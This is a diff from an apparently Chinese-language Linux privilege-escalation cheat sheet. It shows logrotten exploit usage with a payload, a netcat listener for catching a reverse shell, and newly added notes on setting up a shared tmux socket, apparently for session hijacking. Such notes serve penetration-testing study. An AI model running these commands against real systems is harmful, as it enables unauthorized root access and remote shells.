@@ -189,3 +189,9 @@ grep "create\|compress" /etc/logrotate.conf | grep -v "#"            查看确�
 ./logrotten -p ./payload /tmp/tmp.log
 kali:~$ nc -nlvp 9001
 想办法触发日志轮转，例如不断写入 /tmp/tmp.log
+
+
+tmux -S /shareds new -s debugsess      在 /shareds 这个 socket 文件上创建一个名为 debugsess 的 tmux 会话，没有的话会自动创建
+chown root:devs /shareds               把 /shareds 的属主改成 root，属组改成 devs
+
+
